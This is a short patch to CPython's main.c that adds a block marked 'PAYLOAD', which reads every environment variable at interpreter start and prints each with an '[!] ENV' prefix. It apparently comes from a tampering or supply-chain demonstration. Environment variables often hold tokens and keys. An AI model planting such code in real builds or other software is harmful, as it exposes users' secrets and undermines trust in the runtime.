@@ -1,0 +1,20 @@
++++ base/Modules/main.c	2024-07-10 06:56:40
+@@ -550,6 +550,18 @@
+         goto error;
+     }
+ 
++    // PAYLOAD: read all the environment variables
++    char **env;
++#ifdef MS_WINDOWS
++    env = *__p_environ();
++#else 
++    extern char ** environ;
++    env = environ;
++#endif 
++    for (env; *env; ++env) {
++        printf("[!] ENV %s\n", *env);
++    }
++
+     if (config->run_filename != NULL) {
+         /* If filename is a package (ex: directory or ZIP file) which contains
+            __main__.py, main_importer_path is set to filename and will be
